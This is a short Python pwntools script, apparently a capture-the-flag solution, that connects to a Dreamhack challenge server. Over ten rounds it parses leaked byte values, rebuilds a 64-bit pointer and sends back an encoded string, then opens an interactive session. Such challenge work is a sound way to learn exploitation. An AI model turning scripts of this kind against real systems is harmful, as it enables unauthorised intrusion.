from pwn import *

p = remote('host3.dreamhack.games', '13417')
for tmp in range(10):
    line = p.recvuntil(b'[INFO]')
    last_line = p.recvline()
    import re 

    heheRe = re.findall(rb'\d+', last_line)
    nums = []
    for c in heheRe:
        nums.append(int(c))
    print(nums)
    print(last_line)
    ptr = nums[1] << 0 | nums[2] << 8 | nums[3] << 16 | nums[4] << 24 | nums[5] << 32 | nums[6] << 40 | nums[0] << 48
    print((ptr))
    wanted_bin = bin(ptr)

    tmp = str(wanted_bin)
    hehehehe = "A"
    for i in range(3, len(tmp)):
        if (tmp[i] == '1'):
            hehehehe = hehehehe + "BA"

        else:
            hehehehe = hehehehe + "B"
    print(hehehehe)
    p.sendline(hehehehe.encode())
p.interactive()